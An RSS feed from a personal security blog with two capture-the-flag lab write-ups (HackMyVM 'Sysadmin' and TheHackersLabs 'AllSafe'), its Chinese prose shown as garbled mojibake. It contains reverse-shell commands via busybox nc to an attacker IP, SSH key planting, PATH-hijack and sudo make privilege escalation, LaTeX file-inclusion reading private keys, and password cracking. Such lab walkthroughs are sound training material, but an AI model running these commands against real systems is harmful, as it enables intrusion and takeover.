<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Sunset Blog</title>
        <link>https://www.sunsetaction.top</link>
        <description>Sunsetçš„ä¸ªäººåšå®¢ï¼Œè®°å½•ç”Ÿæ´»å­¦ä¹ ç‚¹æ»´ã€‚åˆ†äº«ç½‘ç»œå®‰å…¨ã€æ¸—é€æµ‹è¯•ã€CTF writeupã€æŠ€æœ¯æ–‡ç« ç­‰å†…å®¹ã€‚</description>
        <lastBuildDate>Sat, 25 Oct 2025 15:54:43 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Feed for Node.js</generator>
        <language>zh-CN</language>
        <image>
            <title>Sunset Blog</title>
            <url>https://www.sunsetaction.top/images/logo.png</url>
            <link>https://www.sunsetaction.top</link>
        </image>
        <copyright>All rights reserved 2025, Sunset</copyright>
        <item>
            <title><![CDATA[HackMyVM - Sysadmin]]></title>
            <link>https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin</guid>
            <pubDate>Sat, 25 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan æšä¸¾ 80 ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ˜¯è®©æˆ‘ä»¬ä¸Šä¼  C è¯­è¨€æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šè¿è¡Œ ç«¯å£æ‰«æ F12 æŸ¥çœ‹æºç æ—¶å‘ç° RCE è¿™é‡Œçš„çŒœæµ‹æ˜¯ï¼Œä¸Šä¼  c...]]></description>
            <content:encoded><![CDATA[
# Sysadmin.

> https://hackmyvm.eu/machines/machine.php?vm=Sysadmin
> 

![image.png](/post-images/HackMyVMSysadmin/image.png)

## Recon

### PortScan

```python
âœ  ~ nmap -sT -min-rate 10000 -p- 192.168.56.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:08 CST
Nmap scan report for 192.168.56.210
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds
```

```python
âœ  ~ nmap -sT -A -p 22,80 192.168.56.210        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:14 CST
Nmap scan report for 192.168.56.210
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: C Code Upload
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```

### æšä¸¾

`80` ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ˜¯è®©æˆ‘ä»¬ä¸Šä¼  `C` è¯­è¨€æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šè¿è¡Œ

![image.png](/post-images/HackMyVMSysadmin/image1.png)

ç«¯å£æ‰«æ

```python
âœ  sysadmin feroxbuster --url http://192.168.56.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt

                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.210
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      156w     2384c http://192.168.56.210/index.php
200      GET       59l      156w     2384c http://192.168.56.210/
[####################] - 50s   661641/661641  0s      found:2       errors:1      
[####################] - 50s   661635/661635  13173/s http://192.168.56.210/
```

F12 æŸ¥çœ‹æºç æ—¶å‘ç°

```python
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

![image.png](/post-images/HackMyVMSysadmin/image2.png)

## RCE

è¿™é‡Œçš„çŒœæµ‹æ˜¯ï¼Œä¸Šä¼  c æ–‡ä»¶åï¼Œç„¶åé€šè¿‡ä¸Šè¾¹çš„è¯­å¥è¿›è¡Œç¼–è¯‘ç„¶åè¿è¡Œï¼Œä½†æ˜¯ç¼–è¯‘è¯­å¥ä¸­å¸¦æœ‰ `-nostdinc` ä¸ä½¿ç”¨é»˜è®¤ç³»ç»Ÿåº“å‡½æ•°åŠä¸æœç´¢é»˜è®¤å¤´æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥å¯¼å…¥ `stdio.h` ç­‰ï¼Œéœ€è¦ç»•è¿‡

é€šè¿‡ä½¿ç”¨å†…è”å‡½æ•°å®šä¹‰ï¼Œè¦åœ¨ä¸ä¾èµ– `stdlib.h` çš„æƒ…å†µä¸‹è°ƒç”¨ systemï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨å£°æ˜å®ƒï¼š

æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨RCE

```python
int system(const char *command);
int main() {
    system("busybox nc 192.168.56.5 1234"); // Attempt to spawn a shell
    return 0;
}
```

å­˜åœ¨ RCE

![image.png](/post-images/HackMyVMSysadmin/image3.png)

è¿›è¡Œåå¼¹ `shell`

```python
int system(const char *command);
int main() {
    system("busybox nc 192.168.56.5 1234 -e /bin/bash"); // Attempt to spawn a shell
    return 0;
}
```

ä½†æ˜¯è¿ä¸Šè¿ä¸Šä¸åˆ°ä¸€ä¼šå°±æ–­æ‰äº†

![image.png](/post-images/HackMyVMSysadmin/image4.png)

å°è¯•å†™å…¬é’¥ï¼Œé¦–å…ˆè·å–ç”¨æˆ·å

```python
int system(const char *command);
int main() {
    system("echo $(whoami) | busybox nc 192.168.56.5 80");
    return 0;
}
```

å¾—åˆ°ç”¨æˆ·å `echo`

![image.png](/post-images/HackMyVMSysadmin/image5.png)

å†™å…¬é’¥

```python
# Kali
cat ~/.ssh/authorized_keys >  authorized_keys
python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```python
int system(const char *command);
int main() {
    system("mkdir -p ~/.ssh && busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys");
    return 0;
}
```

![image.png](/post-images/HackMyVMSysadmin/image6.png)

é€šè¿‡ç§é’¥è¿›è¡Œç™»å½•

![image.png](/post-images/HackMyVMSysadmin/image7.png)

è¿›å»åèƒ½è¯» `user.txt`

```python
echo@Sysadmin:~$ cat user.txt 
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

## å‘½ä»¤åŠ«æŒ

æŸ¥çœ‹ `sudo` æƒé™

```python
echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

å…¶ä¸­ `!env_reset` å¯èƒ½å­˜åœ¨è·¯å¾„åŠ«æŒ

æŸ¥çœ‹è„šæœ¬

```python
echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

å¯ä»¥çœ‹åˆ°å¾ˆå¤šå¯ä»¥åŠ«æŒçš„å‘½ä»¤

```python
echo@Sysadmin:~$ echo "chmod +s /bin/bash" > /tmp/df
echo@Sysadmin:~$ chmod +x /tmp/df
echo@Sysadmin:~$ export PATH="/tmp:$PATH"
echo@Sysadmin:~$ sudo /usr/local/bin/system-info.sh
```

![image.png](/post-images/HackMyVMSysadmin/image8.png)]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>RCE</category>
            <category>Hijack</category>
            <category>Path_Hijack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - AllSafe]]></title>
            <link>https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe</guid>
            <pubDate>Tue, 21 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan æšä¸¾ 80 ç«¯å£ï¼ŒåŸŸåæ˜¯ allsafe.thl ç›®å½•æ‰«æï¼Œæ‰«å‡ºæ¥çš„ä¸œè¥¿å¤ªå¤šå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥çœ‹çš„ ä¸»ç«™ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æäº¤ç½‘å€ï¼Œæ‰€ä»¥ç´¢æ€§æµ‹è¯•äº† SSRF...]]></description>
            <content:encoded><![CDATA[
# AllSafe

> https://labs.thehackerslabs.com/machine/139
> 

![image.png](/post-images/TheHackersLabsAllSafe/image.png)

## Recon

### PortScan

```python
âœ  AllSafe nmap -sT -min-rate 10000 -p- 192.168.56.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:38 CST
Nmap scan report for 192.168.56.130
Host is up (0.00036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 18.73 seconds
```

```python
âœ  AllSafe nmap -sT -A -p 22,80,2222 192.168.56.130       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:40 CST
Nmap scan report for 192.168.56.130
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.65 ((Debian))
|_http-title: Allsafe
|_http-server-header: Apache/2.4.65 (Debian)
2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
MAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.56.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds
```

### æšä¸¾

80 ç«¯å£ï¼ŒåŸŸåæ˜¯ `allsafe.thl`

![image.png](/post-images/TheHackersLabsAllSafe/image1.png)

ç›®å½•æ‰«æï¼Œæ‰«å‡ºæ¥çš„ä¸œè¥¿å¤ªå¤šå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥çœ‹çš„

![image.png](/post-images/TheHackersLabsAllSafe/image2.png)

ä¸»ç«™ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æäº¤ç½‘å€ï¼Œæ‰€ä»¥ç´¢æ€§æµ‹è¯•äº† SSRFï¼Œä½†æ˜¯æ²¡æœ‰è§¦å‘ï¼Œä½†æ˜¯æµ‹è¯• `localhost` çš„æ—¶å€™è¿”å›äº† `1234565even`

![image.png](/post-images/TheHackersLabsAllSafe/image3.png)

åé¢æ²¡æ‰¾åˆ°å…¶ä»–çš„ä¸œè¥¿

å°è¯•å­åŸŸåçˆ†ç ´

```python
âœ  AllSafe ffuf -u 'http://allsafe.thl/' -H 'host:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 7016

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://allsafe.thl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.allsafe.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7016
________________________________________________

intranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
```

å¾—åˆ°å­åŸŸå `intranet` ï¼Œè®¿é—®ï¼Œç™»å½•éœ€è¦å‘˜å·¥ ID æ ¼å¼ä¸º `x-xxx-xxxx` ï¼Œå¯†ç ä¼°è®¡å°±æ˜¯ä¸Šè¾¹çš„å¾—åˆ°çš„ `123456Seven`

![image.png](/post-images/TheHackersLabsAllSafe/image4.png)

è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œç›®å½•çˆ†ç ´

```python
âœ  AllSafe gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://intranet.allsafe.thl/                    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intranet.allsafe.thl/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> login.php]
/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
/login.php            (Status: 200) [Size: 2075]
/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
/profile.php          (Status: 200) [Size: 2305]
/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
/customers.php        (Status: 200) [Size: 11072]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]
```

çœ‹åˆ°æœ‰ `customers.php` ï¼Œè¿›è¡ŒæŸ¥çœ‹ï¼Œå¾—åˆ°å¾ˆå¤šçš„å‘˜å·¥ä¿¡æ¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‘˜å·¥ ID

![image.png](/post-images/TheHackersLabsAllSafe/image5.png)

æœ€ååœ¨ä¸»ç«™çš„ â€œæˆ‘ä»¬çš„å›¢é˜Ÿâ€ ä¸­æ‰¾åˆ°äº†ç±»ä¼¼å‘˜å·¥ ID çš„ä¸œè¥¿

![image.png](/post-images/TheHackersLabsAllSafe/image6.png)

`0-477-9990`

![image.png](/post-images/TheHackersLabsAllSafe/image7.png)

æµ‹è¯•ç™»å½• `0-477-9990`:`123456Seven` 

æˆåŠŸè¿›å…¥åå°

![image.png](/post-images/TheHackersLabsAllSafe/image8.png)

## åå°åˆ©ç”¨

### ä¿¡æ¯æ”¶é›†

åå°å°è¯•å¯»æ‰¾å¯åˆ©ç”¨çš„ç‚¹

ç‚¹å‡» `Contrato` å¯ä»¥æŸ¥çœ‹åˆåŒ

![image.png](/post-images/TheHackersLabsAllSafe/image9.png)

å½“å‰åœ¨ `process` ç›®å½•ä¸­

![image.png](/post-images/TheHackersLabsAllSafe/image10.png)

åœ¨å…¶ä¸­çš„ä¸€ä¸ªæ–‡æ¡£ä¸­è¿˜èƒ½ç¿»åˆ° `/etc/passwd` çš„è¾“å‡º

![image.png](/post-images/TheHackersLabsAllSafe/image11.png)

æŸ¥çœ‹å…¶ tex æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ° `Empresa` å‚æ•°å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«

![image.png](/post-images/TheHackersLabsAllSafe/image12.png)

å…¶ä¸­è¿˜æœ‰ä¸€ä¸ªè¯»å–äº† `SSH` ç§é’¥çš„

![image.png](/post-images/TheHackersLabsAllSafe/image13.png)

æŸ¥çœ‹åˆ°è¯»å–çš„æ˜¯ `/home/parker/.ssh/id_rsa`

![image.png](/post-images/TheHackersLabsAllSafe/image14.png)

### ä»»æ„æ–‡ä»¶è¯»å–

å°† `PDF` ä¸Šçš„ `id_rsa` è¿›è¡Œä¿®å¤

```python
# å‡è®¾æ–‡ä»¶æ˜¯ key.txt
cat id_rsa | grep -v "PRIVATE KEY" | tr -d ' \n' | fold -w 70 > fixed_key_body.txt
# ç„¶ååŠ ä¸Šå¤´å°¾
echo "-----BEGIN OPENSSH PRIVATE KEY-----" > fixed_key.txt
cat fixed_key_body.txt >> fixed_key.txt
echo "-----END OPENSSH PRIVATE KEY-----" >> fixed_key.txt
```

ä½†æ˜¯è²Œä¼¼ä¸èµ·æ•ˆ

```python
âœ  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222
parker@192.168.56.130's password: 
```

é‡æ–°è¯»å–ä¸€ä¸‹ `id_rsa`ï¼Œå’Œä¸Šè¾¹ä¸€æ ·è¿›è¡ŒåŒ…å«å³å¯

```python
\lstinputlisting{/home/parker/.ssh/id_rsa}
```

![image.png](/post-images/TheHackersLabsAllSafe/image15.png)

![image.png](/post-images/TheHackersLabsAllSafe/image16.png)

å†å’Œä¸Šè¾¹ä¸€æ ·ä¿®å¤ä¸€æ¬¡åè¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•

```python
âœ  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222
parker@153504fd9bcb:~$ 
```

## æ¨ªå‘ç§»åŠ¨ - å®¹å™¨é€ƒé€¸

### to goddard

è¿›æ¥åæˆ‘ä»¬æ˜¯åœ¨å®¹å™¨é‡Œé¢

```python
parker@153504fd9bcb:~$ ls -al /
total 68
drwxr-xr-x   1 root root 4096 Oct 11 18:41 .
drwxr-xr-x   1 root root 4096 Oct 11 18:41 ..
-rwxr-xr-x   1 root root    0 Oct 11 18:41 .dockerenv
lrwxrwxrwx   1 root root    7 May 12 19:25 bin -> usr/bin
drwxr-xr-x   2 root root 4096 May 12 19:25 boot
drwxr-xr-x   5 root root  340 Oct 21 04:28 dev
drwxr-xr-x   1 root root 4096 Oct 11 18:41 etc
drwxr-xr-x   1 root root 4096 Aug 24 18:39 home
lrwxrwxrwx   1 root root    7 May 12 19:25 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 12 19:25 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Aug 11 00:00 media
drwxr-xr-x   2 root root 4096 Aug 11 00:00 mnt
drwxr-xr-x   2 root root 4096 Aug 11 00:00 opt
dr-xr-xr-x 149 root root    0 Oct 21 04:28 proc
drwx------   1 root root 4096 Aug 24 18:39 root
drwxr-xr-x   1 root root 4096 Oct 11 18:41 run
lrwxrwxrwx   1 root root    8 May 12 19:25 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Aug 11 00:00 srv
dr-xr-xr-x  13 root root    0 Oct 21 04:28 sys
drwxrwxrwt   1 root root 4096 Oct 21 06:23 tmp
drwxr-xr-x   1 root root 4096 Aug 11 00:00 usr
drwxr-xr-x   1 root root 4096 Aug 12 22:31 var
```

æ•°æ®åº“å¯†ç ï¼Œä½†æ˜¯è¿ä¸ä¸Š

```python
parker@153504fd9bcb:/var/www/intranet$ cat db.php 
<?php

$dsn = "mysql:host=db;dbname=allsafe;charset=utf8";
$username = "root";
$password = "31jB2rcbG1Pjorbd93eaxHW";

try {
    $pdo = new PDO($dsn, $username,  $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOExecption) {
    die("Connection failed: " . $e->getMessage());
}
```

`mail` é‡Œé¢æœ‰ä¸œè¥¿

```python
parker@153504fd9bcb:/var/mail/parker$ cat meeting 
From goddard@localhost Thu Aug 21 14:05:20 2025
Date: Thu, 21 Aug 2025 14:05:20 +0000
From: goddard@localhost
To: parker@localhost
Subject: ReuniÃ³n con E-Corp
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hola Oliver,

Te adjunto las notas que armÃ© para la reuniÃ³n con el cliente.  
Revisalo y confirmame si llegamos con todo.

Saludos,  
Gideon

--BOUNDARY
Content-Type: text/plain; name="meeting_notes.txt"
Content-Disposition: attachment; filename="meeting_notes.txt"
Content-Transfer-Encoding: 7bit

Meeting Notes - E-Corp
----------------------
1. Confirmar agenda con el cliente.
2. Revisar documentaciÃ³n tÃ©cnica.
3. Validar acceso al portal con la credencial:

   Clave de acceso: 6D7033386E71556654416130494D314F70306157

4. Preparar demo corta del servicio.
--BOUNDARY--
EOF.
```

å…¶ä¸­å‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªç§˜é’¥ `6D7033386E71556654416130494D314F70306157`

å…¸å‹ 16 è¿›åˆ¶ç¼–ç ï¼Œè§£å‡ºæ¥æ˜¯ `mp38nqUfTAa0IM1Op0aW`

![image.png](/post-images/TheHackersLabsAllSafe/image17.png)

è¯¥å¯†ç æ˜¯ç”¨æˆ· `goddard` çš„å¯†ç 

```python
parker@153504fd9bcb:/var/mail/parker$ su goddard
Password: 
goddard@153504fd9bcb:/var/mail/parker$ 
```

### to root

æŸ¥çœ‹ sudo æƒé™

```python
goddard@153504fd9bcb:/var/mail/parker$ sudo -l
Matching Defaults entries for goddard on 153504fd9bcb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User goddard may run the following commands on 153504fd9bcb:
    (ALL) NOPASSWD: /usr/bin/make
```

ç›´æ¥ææƒåˆ° `root`

```python
goddard@153504fd9bcb:/var/mail/parker$ COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'"$COMMAND"
# 
# id
uid=0(root) gid=0(root) groups=0(root)
```

### to cisco

å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ª `psafe3` æ–‡ä»¶

```python
# ls
secrets.psafe3
```

`PSAFE3` æ–‡ä»¶å¤§å¤šå±äº `Password Safe`ã€‚ `Password Safe` å¯è®©æ‚¨å®‰å…¨è½»æ¾åœ°åˆ›å»ºå®‰å…¨åŠ å¯†çš„ç”¨æˆ·å/å¯†ç åˆ—è¡¨ã€‚

å› ä¸ºéœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ï¼Œæˆ‘ä»¬é€šè¿‡ `john` è¿›è¡Œçˆ†ç ´

```python
âœ  AllSafe pwsafe2john secrets.psafe3 > hash

âœ  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockandroll      (secret)     
1g 0:00:00:43 DONE (2025-10-21 15:51) 0.02321g/s 190.2p/s 190.2c/s 190.2C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

å¾—åˆ°å¯†ç  `rockandroll`

æ–‡ä»¶é€šè¿‡ `password safe` æ‰“å¼€

![image.png](/post-images/TheHackersLabsAllSafe/image18.png)

```python
sMpam!xxxxxxxxxxxxxxxxxx
```

![image.png](/post-images/TheHackersLabsAllSafe/image19.png)

## ææƒ

### ä¿¡æ¯æ”¶é›†

å½“å‰ç›®å½•æ–‡ä»¶

```python
cisco@allsafe:~$ ls
darkarmy.bin  user.txt
```

å®¶ç›®å½•ä¸‹èƒ½è¯»å– user.txt

```python
cisco@allsafe:~$ cat user.txt 
e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

darkarmy.bin

```python
cisco@allsafe:~$ strings darkarmy.bin 
70617373776f72643d64726b32303235210a
```

è¿˜æ˜¯ HEX ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªå¯†ç  `drk2025!`

![image.png](/post-images/TheHackersLabsAllSafe/image20.png)

å®¶ç›®å½•ä¸‹éšè—æ–‡ä»¶ `.unknow`

```python
cisco@allsafe:~$ cat .unknown
Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
A partir de ahora, todo contacto serÃ¡ Ãºnicamente a travÃ©s del canal seguro.

ConÃ©ctate al servidor de mensajerÃ­a y entra en la sala:
    dark-ops

No intentes usar este acceso para nada mÃ¡s que lo acordado.
Nosotros decidimos cuÃ¡ndo y cÃ³mo se conversa.
```

> å¦‚æœæ‚¨æƒ³è”ç³»æˆ‘ä»¬ï¼Œè¯·ä¸è¦ä½¿ç”¨å¸¸è§„æ¸ é“ã€‚
ä»ç°åœ¨å¼€å§‹ï¼Œæ‰€æœ‰è”ç³»éƒ½å°†ä»…é€šè¿‡å®‰å…¨æ¸ é“è¿›è¡Œã€‚
> 
> 
> è¿æ¥åˆ°æ¶ˆæ¯æœåŠ¡å™¨å¹¶è¿›å…¥æˆ¿é—´ï¼š
> dark-ops
> 
